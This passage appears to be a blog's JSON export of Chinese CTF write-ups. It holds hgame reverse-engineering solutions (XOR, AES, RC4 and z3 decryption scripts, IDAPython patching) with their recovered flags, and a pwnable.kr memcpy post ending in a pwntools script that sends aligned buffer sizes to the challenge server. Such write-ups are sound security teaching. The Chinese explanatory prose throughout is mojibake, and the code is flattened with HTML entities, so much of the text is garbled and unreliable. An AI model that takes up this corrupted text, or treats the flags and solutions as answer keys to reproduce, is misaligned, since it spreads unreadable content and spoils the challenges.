2460223225&#125;; uint32_t key[] = &#123; 1,2,3,4 &#125;; XXTEA(-35, arr, key); for (int i = 0; i &lt; 35; i++) &#123; printf(&quot;%c&quot;, arr[i]); &#125; return 0;&#125; Welcome to reverse world !ç®€å•é¢˜ï¼Œä¸€ä¸ªå¼‚æˆ–ç›´æ¥æå®š 12345678from ida_bytes import *def re(): addr = 0x00007FF7F7513480 flag = &#x27;&#x27; for i in range(22): flag += chr((0xff - i) ^ get_byte(addr +i)) print(flag) pypyç»™äº†æˆ‘ä»¬pythonå­—èŠ‚ç ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±è¿˜åŸæˆpythonä»£ç ï¼Œä¸‹é¢è´´è¿˜åŸè¿‡åçš„ä»£ç ï¼ŒåŠ å¯†è¿‡ç¨‹å¾ˆç®€å• 123456789101112131415161718import disdef input_func(): raw_flag = input(&#x27;give me your flag:\\n&#x27;) cipher = list(raw_flag[6:-1]) length = len(cipher) for i in range(length // 2): cipher[2*i], cipher[2*i+1] = cipher[2*i+1] , cipher[2*i] res = [] for i in range(length): res.append(ord(cipher[i]) ^ i) res = bytes(res).hex() print(&#x27;your flag: &#x27; + res)# print(dis.dis(input_func)) è§£å¯†è„šæœ¬ 12345678910111213141516def Cip(): flag = &#x27;&#x27; res = [] cipher = &#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27; length = len(cipher) for i in range(0, length, 2): res.append(int(cipher[i:i+2],16)) for i in range(len(res)): flag += chr(res[i] ^ i) flag = list(flag) for i in range(len(flag) // 2): flag[i*2+1], flag[i*2] = flag[i*2],flag[i*2 + 1] for i in range(len(flag)): print(flag[i],end=&#x27;&#x27;)# hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125; RE-week2helloRe2æœ‰ä¸¤å¤„æ£€æµ‹ï¼Œç¬¬ä¸€å¤„ç›´æ¥æ˜æ–‡æ¯”è¾ƒï¼Œä½†æ˜¯æ³¨æ„è¦å€’åº 1password1: 2b0c5e6a3a20b189 ç¬¬äºŒå¤„å¼€å¯äº†å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œåˆ©ç”¨äº†ç¬¬ä¸€æ¬¡æ£€æµ‹çš„è¾“å…¥å€¼å¼‚æˆ–ä¸€æ¬¡åä½œä¸ºç§˜é’¥ï¼Œè¿›è¡ŒCBCæ¨¡å¼çš„AESåŠ å¯†ï¼Œåˆå§‹å‘é‡ä¸º0-15 1234567891011from Cryptodome.Cipher import AESkey = &#x27;2b0c5e6a3a20b189&#x27;key = bytes(ord(key[i])^i for i in range(16))Cipher = bytes([183, 254, 254, 217, 7, 118, 121, 101, 63, 78, 95, 98, 213, 2, 246, 126])iv = bytes(i for i in range(16))aes = AES.new(key,AES.MODE_CBC,iv)Plain = aes.decrypt(Cipher)print(Plain)# 7a4ad6c5671fb313 app-releaseä¸ç†Ÿæ‚‰å®‰å“ï¼Œä½†æ˜¯ç»è¿‡ä¸€ç³»åˆ—ç½‘ä¸Šæ‰¾èµ„æ–™åæŸ¥åˆ°äº†å¦‚ä½•é€†å‘APKä»£ç ï¼Œè¿‡ç¨‹å¾ˆç®€å•ï¼Œå°±æ˜¯å°†KEYè¿›è¡Œsha256è®¡ç®—æˆ16ä½çš„keyï¼Œè¿›è¡ŒAESåŠ å¯†ååœ¨è¿›è¡Œbase64ç¼–ç  12345678910111213141516import hashlibimport base64from Cryptodome.Cipher import AESstring = b&#x27;A_HIDDEN_KEY&#x27;flag = b&#x27;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&#x27;key = hashlib.sha256(string).digest()iv = hashlib.md5(string).digest()Cipher = base64.b64decode(flag)aes = AES.new(key, AES.MODE_CBC, iv)Plain = aes.decrypt(Cipher)print(Plain)# hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125; RE-week3ç¬¬ä¸‰å‘¨åªåšå‡ºæ¥ä¸€é“é¢˜ FAKEç®€å•çš„smcï¼Œå‡½æ•°sub_40699Bè¿›è¡Œäº†ä»£ç è§£å¯†å·¥ä½œï¼Œé¦–å…ˆç”¨idaPythonå°†åŠ å¯†åçš„ä»£ç è§£ç ä¾¿äºé™æ€åˆ†æ 12345678from ida_bytes import *addr1 = 0x0000000000401216addr2 = 0x0000000000409080for i in range(1086): x = get_byte(addr1+i) y = get_byte(addr2+i) patch_byte(addr1+i,x^y) è§£å¯†åçš„å…³é”®ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586input = (char *)CmpData;memset(CmpData, 0, 0x90uLL);v38[0] = 55030;v38[1] = 61095;v38[2] = 60151;v38[3] = 57247;v38[4] = 56780;v38[5] = 55726;v38[6] = 46642;v38[7] = 52931;v38[8] = 53580;v38[9] = 50437;v38[10] = 50062;v38[11] = 44186;v38[12] = 44909;v38[13] = 46490;v38[14] = 46024;v38[15] = 44347;v38[16] = 43850;v38[17] = 44368;v38[18] = 54990;v38[19] = 61884;v38[20] = 61202;v38[21] = 58139;v38[22] = 57730;v38[23] = 54964;v38[24] = 48849;v38[25] = 51026;v38[26] = 49629;v38[27] = 48219;v38[28] = 47904;v38[29] = 50823;v38[30] = 46596;v38[31] = 50517;v38[32] = 48421;v38[33] = 46143;v38[34] = 46102;v38[35] = 46744;v37[0] = &#x27;h&#x27;;v37[1] = &#x27;g&#x27;;v37[2] = &#x27;a&#x27;;v37[3] = &#x27;m&#x27;;v37[4] = &#x27;e&#x27;;v37[5] = &#x27;&#123;&#x27;;v37[6] = &#x27;@&#x27;;v37[7] = &#x27;_&#x27;;v37[8] = &#x27;F&#x27;;v37[9] = &#x27;A&#x27;;v37[10] = &#x27;K&#x27;;v37[11] = &#x27;E&#x27;;v37[12] = &#x27;_&#x27;;v37[13] = &#x27;f&#x27;;v37[14] = &#x27;l&#x27;;v37[15] = &#x27;a&#x27;;v37[16] = &#x27;g&#x27;;v37[17] = &#x27;!&#x27;;v37[18] = &#x27;-&#x27;;v37[19] = &#x27;d&#x27;;v37[20] = &#x27;o&#x27;;v37[21] = &#x27;_&#x27;;v37[22] = &#x27;Y&#x27;;v37[23] = &#x27;0&#x27;;v37[24] = &#x27;u&#x27;;v37[25] = &#x27;_&#x27;;v37[26] = &#x27;k&#x27;;v37[27] = &#x27;o&#x27;;v37[28] = &#x27;n&#x27;;v37[29] = &#x27;w&#x27;;v37[30] = &#x27;_&#x27;;v37[31] = &#x27;S&#x27;;v37[32] = &#x27;M&#x27;;v37[33] = &#x27;C&#x27;;v37[34] = &#x27;?&#x27;;v37[35] = &#x27;&#125;&#x27;;v44 = 1;for ( i = 0; i &lt;= 5; ++i )&#123; for ( j = 0; j &lt;= 5; ++j ) &#123; for ( k = 0; k &lt;= 5; ++k ) &#123; LODWORD(input) = CmpData[6 * i + j] + v37[6 * k + j] * *(_DWORD *)&amp;a1[24 * i + 4 * k]; CmpData[6 * i + j] = (int)input; &#125; &#125;&#125; è§‚å¯Ÿåå‘ç°å°±æ˜¯ä¸€ä¸ª6*6çš„çŸ©é˜µè¿ç®—ï¼Œz3è§£ä¹‹ 123456789101112131415161718192021222324from z3 import *s = Solver()res = [ 55030, 61095, 60151, 57247, 56780, 55726, 46642, 52931, 53580, 50437, 50062, 44186, 44909, 46490, 46024, 44347, 43850, 44368, 54990, 61884, 61202, 58139, 57730, 54964, 48849, 51026, 49629, 48219, 47904, 50823, 46596, 50517, 48421, 46143, 46102, 46744 ]x = [BitVec(&quot;x_%d&quot; % i, 8) for i in range(36)]y = [104,103,97,109,101,123,64,95,70,65,75,69,95,102,108,97,103,33,45,100,111,95,89,48,117,95,107,111,110,119,95,83,77,67,63,125]for i in range(6): for j in range(6): key=0 for n in range(6): key += y[6*n+j]*x[6*i+n] #print(i*6+j) s.add(key == res[i*6+j])flag = &#x27;&#x27;if s.check() == sat: for i in range(36): char = s.model().eval(x[i]).as_long() flag += chr(char) print(flag)# hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125; helloRE3è¿™é“é¢˜æ²¡æœ‰æå‡ºæ¥ï¼Œåé¢çœ‹wpå¤ç°ï¼Œå¯¹äºwindowsæ¶ˆæ¯æœºåˆ¶ä»¥åŠå¸¦ç•Œé¢çš„ç¨‹åºé€†å‘ä¸ç†Ÿæ‚‰ã€‚ åœ¨ç‚¹å‡»Checkæ—¶ï¼ŒDbgviewæ˜¾ç¤ºorderä¸º65å¹¶ä¸”æ˜¾ç¤ºè¾“å…¥é•¿åº¦ã€‚ æ‰“å¼€idaæœç´¢å­—ç¬¦ä¸²playeræ‰¾åˆ°å¯¹åº”å‡½æ•°ï¼Œå‘ç°æœ‰ä¸€å¤„ == 65çš„åˆ¤å®šï¼Œä¼šç»™ä¸€ä¸ªå€¼å¤åˆ¶ä¸º1ï¼Œxäº¤å‰å¼•ç”¨å‘ç°ä¸€åªä¸€ä¸ªå‡½æ•°è°ƒç”¨äº†è¯¥å…¨åŒºå˜é‡ ä½†æ˜¯ä¼šæç¤ºå‡½æ•°æ— æ³•f5ï¼Œå› ä¸ºæ ˆæŒ‡é’ˆä¸å¹³è¡¡ã€‚ æ‰¾åˆ°å¯¹åº”çš„åœ°å€ï¼Œå‘ç°æœ‰call popç»“æ„ï¼Œç›®çš„æ˜¯ä¸ºäº†å°†callæŒ‡ä»¤çš„ä¸‹ä¸€æ¡åœ°å€é€å…¥raxå¯„å­˜å™¨ä¸­ï¼Œè¿™é‡Œå°†raxè®¾ç½®ä¸º0x00007FF708DE8C3Eä½œä¸ºä¸‹é¢rc4åŠ å¯†çš„ç§˜é’¥ã€‚ä¿®å¤æ ˆæŒ‡é’ˆæŸ¥çœ‹ä¼ªä»£ç ã€‚ åŠ å¯†æµç¨‹æ¯”è¾ƒç®€å•ï¼Œorderä¸­çš„æ•°å€¼å–åï¼ŒRC4åŠ å¯†ï¼Œæ¯”è¾ƒï¼ŒRC4çš„keyé•¿åº¦ä¸º20ï¼Œå€¼ä¸ºåœ°å€0x00007FF708DE8C3Eå¤„å¼€å§‹çš„ç¡¬ç¼–ç  12345678910111213141516171819202122232425# pythonè§£å¯†è„šæœ¬from Cryptodome.Cipher import ARC4def decrypt_rc4(): Cipher = bytes([77, 175, 39, 173, 225, 236, 109, 218, 240, 49, 94, 154, 158, 41, 250, 190, 107, 8, 200, 73]) Key = bytes([144, 144, 88, 72, 137, 69, 208, 101, 72, 139, 4, 37, 96, 0, 0, 0, 72, 139, 64, 2]) rc4 = ARC4.new(Key) Plain = rc4.decrypt(Cipher) Plain = list(0xff^i for i in Plain) return Plaindef find_in_order(Plain): order = [i for i in range(21,33)]+[i for i in range(37,50)]+[i for i in range(54,76)] name = list(&#x27;1234567890-+QWERTYUIOP&#123;&#125;|ASDFGHJKL;\\&#x27;~ZXCVBNM,./&#x27;) key = dict(zip(order,name)) # ç”Ÿæˆå¯¹åº”çš„å­—å…¸ flag = &#x27;&#x27; for i in Plain: flag += key[i] print(flag)find_in_order(decrypt_rc4())# HGAME&#123;6-K4K.4R+3C4T&#125; RE-week4vm çœ‹ä¼¼å¾ˆå¤æ‚ï¼Œå…¶å®æ˜¯è¾“å…¥å•ä¸ªå­—èŠ‚çš„åŠ è§£å¯†ï¼Œç»è¿‡åŠ¨æ€è°ƒè¯•åå‘ç°åªæœ‰å¼‚æˆ–å’Œå‡æ“ä½œï¼Œåˆ†åˆ«å¯¹åº”åˆ°çš„è™šæ‹ŸæœºæŒ‡ä»¤æ˜¯4å’Œ7ï¼Œè¿‡ç¨‹ä¸ºå°†è¾“å…¥é€å…¥vm_eaxå¯„å­˜å™¨ï¼Œvm_ebxå¯„å­˜å™¨ä¸­æ˜¯ç”Ÿæˆçš„æ“ä½œæ•°ï¼ŒåŠ¨æ€è°ƒè¯•å³å¯è·å¾—ã€‚ 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;Windows.h&gt;int main()&#123; char cipher[] = &#123; 9, 230, 79, 183, 219, 46, 130, 173, 232, 54, 118, 198, 240, 23, 103, 162, 247, 231, 74, 122, 235, 244, 58, 112, 237, 36, 2, 126, 175, 246, 59, 128, 191, 207 &#125;; char Xor[] = &#123; 0xfe,0x21,0x44,0x67,0x8a,0xad,0xd0,0xf3,0x16,0x39,0x5c,0x7f,0xa3,0xc5,0xe8,0x0b,0x2e,0x51,0x74,0x97,0xba,0xdd,0x0,0x23,0x46,0x69,0x8c,0xaf,0xd2,0xf5,0x18,0x3b,0x5e,0x81 &#125;; char Sub[] = &#123; 0x7A,0x1A,0xBA,0x5A,0xFA,0x9A,0x3A,0xDA,0x7A,0x1A,0xBA,0x5A,0xFB,0x9A,0x3A,0xDA,0x7A,0x1A,0xBA,0x5A,0xFA,0x9A,0x3A,0xDA,0x7A,0x1A,0xBA,0x5A,0xFA,0x9A,0x3A,0xDA,0x7A,0x1A &#125;; for (int i = 33; i &gt;= 0; i--) &#123; printf(&quot;%c&quot;, (cipher[i] + Sub[i]) ^ Xor[i]); &#125;&#125;// hgame&#123;w0W!itS_CpP_wItH_little_vM!&#125; AFiveSecondChallengeæ¯”èµ›æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œå¯¹äºc#ä¸ç†Ÿæ‚‰ï¼Œå³ä½¿ä¸»åŠæ–¹åœ¨æœ€åæ”¾å‡ºäº†ç™½ç»™Hintï¼Œè¿˜æ˜¯æä¸å‡ºçŸ©é˜µæ¥ï¼Œçœ‹wpæ…¢æ…¢å¤ç°ã€‚ é¦–å…ˆè¿™æ˜¯ä¸€ä¸ªæ‰«é›·æ¸¸æˆï¼Œç”¨c#å†™çš„ï¼Œæ‰«é›·çš„é€»è¾‘é¢˜ç›®ä¸­è¯´æ˜çš„æ˜¯é€šè¿‡çŸ©é˜µè¿ç®—ï¼Œæ‰€ä»¥ç›´æ¥ç”¨C#åç¼–è¯‘å™¨çœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥æåˆ°æºç ã€‚ä½†æ˜¯å‘ç°çŸ©é˜µè¿ç®—å‡½æ•°è¢«åŠ¨è¿‡æ‰‹è„šã€‚ matrixä¸­çš„æ•°æ®å¾ˆå¤šï¼Œæ ¹æ®å®˜æ–¹ç»™çš„æç¤ºä¸‹è½½æ–‡ä»¶ä¸­ç»™å‡ºäº†il2cppOutPutæ–‡ä»¶ä¸­æœ‰ä¸¤ä¸ªé‡è¦æ–‡ä»¶AFiveSecondChallengeå’ŒAssembly-CSharpï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­æœ‰æ¸¸æˆä¸­çš„æ‰€æœ‰é€»è¾‘ã€‚è¿™é‡Œåªåˆ†æCheckBombAtå‡½æ•°ã€‚ åœ¨Assembly-CSharpæ–‡ä»¶ä¸­çœ‹åˆ°äº†è¿™äº›æ³¨é‡Šï¼ŒCheckBombAtå‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°å«Vector2ï¼Œå‘é‡ä¸­å­˜å‚¨çš„æ˜¯æ•°ç»„çš„åæ ‡ï¼Œä½†æ˜¯matrixæ•°ç»„æ˜¯ä¸€ä¸ªä¸‰ç»´æ•°ç»„ï¼Œä½†æ˜¯è¿™ä¸ªå‘é‡ä¸­åªå­˜å‚¨äº†xå’Œyåæ ‡ã€‚ 12345System.Boolean AFiveSecondChallenge.BombChecker::CheckBombAt(UnityEngine.Vector2) BombChecker.CheckBombAt(_position) BombChecker.CheckBombAt(new Vector2(x - 1, y - 1)) åœ¨çœ‹AFiveSecondChallenge.cppæ–‡ä»¶ï¼Œç›´æ¥æœç´¢CheckBomAtå…³é”®å­—ï¼Œå®šä½åˆ°è¯¥å‡½æ•°ã€‚å‘ç°äº†çŸ©é˜µä¸è¿ç®—çš„ä¸»è¦é€»è¾‘ 123456789Vector2_tA85D2DD88578276CA8A8796756458277E72D073D L_21 = ___vec0; // å¾ªç¯æ—¶çš„å˜é‡ float L_22 = L_21.get_x_0(); V_2 = (((double)((double)((float)il2cpp_codegen_subtract((float)(fmodf(L_22, (3.0f))), (float)(1.0f)))))); double L_23 = V_2; double L_24 = V_2; double L_25 = V_0; // yä¸‹æ ‡ double L_26 = V_2; double L_27 = V_1; // zä¸‹æ ‡ return (bool)((((double)((double)il2cpp_codegen_add((double)((double)il2cpp_codegen_add((double)((double)il2cpp_codegen_multiply((double)((double)il2cpp_codegen_multiply((double)L_8, (double)L_23)), (double)L_24)), (double)((double)il2cpp_codegen_multiply((double)L_25, (double)L_26)))), (double)L_27))) &gt; ((double)(0.0)))? 1 : 0); ä¸Šé¢çš„ä»£ç åŒ–ç®€åå°±æ˜¯ä¸‹é¢çš„æ•°å­¦è¡¨è¾¾å¼ï¼Œæå–matrixè¿›è¡Œå›¾ç‰‡ç»˜åˆ¶ã€‚ 12v_2 = (j % 3) - 1;((x * (v_2 * v_2) + y * v_2 + z) &gt; 0) ? 1 : 0; 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;Windows.h&gt;int main()&#123; double matrix[45][15][3] = &#123;...&#125;; // æ•°æ®å¤ªå¤šçœç•¥ int map[45][45]; double x, y, z; int dot; for (int i = 0; i &lt; 45; i++) &#123; for (int j = 0; j &lt; 45; j++) &#123; double v_2 = (j % 3) - 1; x = matrix[i][j / 3][0]; y = matrix[i][j / 3][1]; z = matrix[i][j / 3][2]; dot = ((x * (v_2 * v_2) + y * v_2 + z) &gt; 0) ? 1 : 0; map[i][j] = dot; &#125; &#125; for (int i = 0; i &lt; 45; i++) &#123; for (int j = 0; j &lt; 45; j++) &#123; printf(&quot;%d&quot;, map[i][j]); &#125; putchar(&#x27;\\n&#x27;); &#125;&#125; æœ€åå¤§æ¦‚æ˜¯è¿™æ ·ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªäºŒç»´ç ã€‚ å†ç”¨pythonçš„PILåº“å°†å…¶æ‰“å°æˆäºŒç»´ç  12345678910111213141516171819from PIL import ImageMAX = 45img = Image.new(&#x27;RGB&#x27;,(MAX,MAX))dot = &quot;111111100011101111100101000001110100101111111100000100001011111010001110100011001001000001101110101110100100000100111010100101001011101101110101101010111001001001001111101101011101101110101110001100101111111011101111101011101100000101011000100101000100011111000001000001111111101010101010101010101010101010101111111000000001100001101111000111101010000100000000101111100001111010101111111000000000101111100000100010001011011110010110001010001010000001000101111000011001000111010110100010011001110010100001000010001111010011000100111000001100100110101111100101101101010101110010010101001010001011101001011011101100000101101110000110010000111101101001010000100101110010010101100101111011101101110000101111101101101000100110110100101000010101010000101010100001110011100000010001001001000100010111111101101100111000011110100010000010100111000011011001010010011000001010101101011111000000101010011011011001011111111100110100101111110001000110111110111111110001100000011111000100011110010100011101001010101001011101011010110010000101101011010101110001100001010011000110010100011100011100001111111101110011011111110001111110111110001111110011111001100101101000010101001001101001100100110100111010001011001011111111011110010010011001000011110111111111101001000100011111011001111110011100011010101010010100001111000011011011001000001000100011111010000111001000100100101001100110001101100010111110010000011011101010111101010100000100001101011010011001110011100010111111000101110101110110010100111001110010111010001101000100001110010100010110000010111111000000010010110100110101110111100011110011101001101111111011001100100011010110100110100011100010011111101000111000111111100000000001110101000011000111001101101100010100111111100101011000101010100000011000101011110100000101100000110101000111001010110100011111101110101111001110001111110000000101111110000101110101111010011010010010011010001111001111101110101110100010000101010010100100101101100100000100111010110100001100000101111111001100111111101000101001110100110101100000100100010&quot;x = 45for i in range(45): for j in range(45): if dot[i*x+j] == &#x27;1&#x27;: img.putpixel((i,j),(0,0,0)) else: img.putpixel((i,j),(0xff,0xff,0xff)) img.show()img.save(&#x27;flag.png&#x27;)# flag: hgame&#123;YOU~hEn-duO_yOU-X|~DOU-sHi~un1Ty~k4i-fA_de_O&#125; ollvmè¿™ä¸ªç¨‹åºå¯¹é‡Œé¢æ‰€æœ‰çš„å­—ç¬¦ä¸²è¿›è¡Œäº†åŠ å¯†ï¼Œéœ€è¦æ…¢æ…¢å¯»æ‰¾åŠ å¯†å‡½æ•°ï¼Œåœ¨åŠ¨æ€è°ƒè¯•åå‘ç°äº†AESçš„S_boxç›’å­ï¼Œä¸”å‘ç°åŠ å¯†æ¨¡å¼ä¸ºCBCæ¨¡å¼ï¼ŒåŠ¨è°ƒå‡ºkeyä¸ivåç›´æ¥å†™è„šæœ¬è§£å¯†ï¼Œåˆå§‹ivä¸º0-15 1234567891011121314from Cryptodome.Cipher import AESiv = bytes(i for i in range(16))Cipher = bytes([145, 179, 193, 235, 20, 93, 213, 206, 58, 29, 48, 228, 112, 108, 107, 215, 105, 120, 121, 2, 163, 165, 223, 27, 253, 28, 2, 137, 20, 32, 122, 253, 36, 82, 248, 169, 249, 241, 107, 28, 15, 93, 80, 91, 236, 66, 209, 140, 184, 18, 207, 44, 169, 105, 49, 70, 253, 155, 234, 222, 200, 191, 148, 105])key = b&#x27;CryptoFAILUREforRSA2048Key!!!!!!&#x27;aes = AES.new(key,AES.MODE_CBC,iv)Plain = aes.decrypt(Cipher)print(Plain)# hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"re","slug":"CTF/re","permalink":"http://example.com/categories/CTF/re/"}],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"}]},{"title":"pwnable.kr memcpy","slug":"CTF/pwn/pwnable/pwnable.kr-memcpy","date":"2021-07-14T04:44:16.850Z","updated":"2021-08-08T09:36:49.570Z","comments":true,"path":"34917/","link":"","permalink":"http://example.com/34917/","excerpt":"","text":"æºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm(&quot;rdtsc&quot;);&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( &quot;movdqa (%0), %%xmm0\\n&quot; &quot;movdqa 16(%0), %%xmm1\\n&quot; &quot;movdqa 32(%0), %%xmm2\\n&quot; &quot;movdqa 48(%0), %%xmm3\\n&quot; &quot;movntps %%xmm0, (%1)\\n&quot; &quot;movntps %%xmm1, 16(%1)\\n&quot; &quot;movntps %%xmm2, 32(%1)\\n&quot; &quot;movntps %%xmm3, 48(%1)\\n&quot; ::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(&quot;Hey, I have a boring assignment for CS class.. :(\\n&quot;); printf(&quot;The assignment is simple.\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;- What is the best implementation of memcpy? -\\n&quot;); printf(&quot;- 1. implement your own slow/fast version of memcpy -\\n&quot;); printf(&quot;- 2. compare them with various size of data -\\n&quot;); printf(&quot;- 3. conclude your experiment and submit report -\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;This time, just help me out with my experiment and get flag\\n&quot;); printf(&quot;No fancy hacking, I promise :D\\n&quot;); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf(&quot;specify the memcpy amount between %d ~ %d : &quot;, low, high); scanf(&quot;%d&quot;, &amp;size); if( size &lt; low || size &gt; high )&#123; printf(&quot;don&#x27;t mess with the experiment.\\n&quot;); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf(&quot;ok, lets run the experiment with your configuration\\n&quot;); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf(&quot;experiment %d : memcpy with buffer size %d\\n&quot;, i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for slow_memcpy : %llu\\n&quot;, t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for fast_memcpy : %llu\\n&quot;, t2-t1); printf(&quot;\\n&quot;); &#125; printf(&quot;thanks for helping my experiment!\\n&quot;); printf(&quot;flag : ----- erased in this source code -----\\n&quot;); return 0;&#125; è¿‡ç¨‹åˆ†æ åœ¨ç”³è¯·çš„å†…å­˜å°äº64æ—¶ï¼Œé‡‡ç”¨çš„æ˜¯slow_memcpyé€ä¸ªå­—èŠ‚çš„å¤åˆ¶ï¼Œæ²¡æœ‰å…¶ä»–è¦æ±‚ï¼Œä½†æ˜¯é€Ÿåº¦è¾ƒæ…¢ 1234567char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125; åœ¨å¤åˆ¶å†…å­˜å¤§äº64ä¸ªå­—èŠ‚æ—¶ï¼Œé‡‡ç”¨fast_memcpyä¸­çš„æŒ‡ä»¤å¤åˆ¶ï¼Œå¤åˆ¶é€Ÿåº¦å¿« 1234567891011121314151617181920212223242526char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( &quot;movdqa (%0), %%xmm0\\n&quot; &quot;movdqa 16(%0), %%xmm1\\n&quot; &quot;movdqa 32(%0), %%xmm2\\n&quot; &quot;movdqa 48(%0), %%xmm3\\n&quot; &quot;movntps %%xmm0, (%1)\\n&quot; &quot;movntps %%xmm1, 16(%1)\\n&quot; &quot;movntps %%xmm2, 32(%1)\\n&quot; &quot;movntps %%xmm3, 48(%1)\\n&quot; ::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125; ç”¨ä½¿ç”¨æŒ‡ä»¤nc pwnable.kr 9022è¿æ¥ï¼Œéšä¾¿è¾“å…¥äº†ä¸€äº›å€¼è¿‡åå‘ç°æ°¸è¿œåœç•™åœ¨äº†ç¬¬å››æ¬¡æ£€æµ‹ï¼Œä½†æ˜¯å¦‚æœåœ¨æœ¬åœ°è¾“å…¥å´å¯ä»¥é€šè¿‡ movdqaæŒ‡ä»¤ movdqaæŒ‡ä»¤çš„æ“ä½œæ•°éƒ½è¦æ±‚16å­—èŠ‚å¯¹é½ï¼Œåœ¨æœ¬åœ°å¯ä»¥æ­£å¸¸è¿è¡Œæ—¶å› ä¸ºmallocæœ¬èº«å°±æ˜¯8å­—èŠ‚å¯¹é½çš„ï¼ŒåŠ ä¸Š8ä¸ªå­—èŠ‚çš„chunkå¤´ï¼Œmallocè¿”å›çš„æŒ‡é’ˆå°±å·²ç»éµå¾ª16å­—èŠ‚å¯¹é½äº†ï¼Œæ‰€ä»¥éšä¾¿è¾“å…¥ä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯åœ¨é¶æœºä¸Šå¯èƒ½æ˜¯å› ä¸ºUbuntuç‰ˆæœ¬çš„é—®é¢˜ï¼Œchunkåœ¨å†…å­˜ä¸­æ˜¯è¿ç»­çš„ï¼Œè€Œä¸éµå¾ªå†…å­˜å¯¹é½ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå·±è®¡ç®—ã€‚ 123456789# è®¡ç®—åœ¨èŒƒå›´ä¸­å¯è¾“å…¥çš„æ•°å­—é‚£äº›ç¬¦åˆè¦æ±‚for i in range(3, 13): if i&lt;6: chunk_size[i-3].append(pow(2,i)) if i &gt;= 6: for size in range(pow(2, i), pow(2, i+1)): if (size-8)%16 == 0: chunk_size[i-3].append(size) exp12345678910111213141516171819202122from pwn import *import oscontext.log_level = &#x27;debug&#x27;sh = remote(&#x27;pwnable.kr&#x27;, 9022)chunk_size = [[], [], [], [], [], [], [], [], [], [], []]for i in range(3, 13): if i&lt;6: chunk_size[i-3].append(pow(2,i)) if i &gt;= 6: for size in range(pow(2, i), pow(2, i+1)): if (size-8)%16 == 0: chunk_size[i-3].append(size)for i in range(3, 13): string = &#x27;specify the memcpy amount between &#123;&#125; ~ &#123;&#125; : &#x27;.format(pow(2,i), pow(2,i+1)) sh.sendlineafter(string, str(chunk_size[i-3][0]))sleep(3)log.success(sh.recv()) 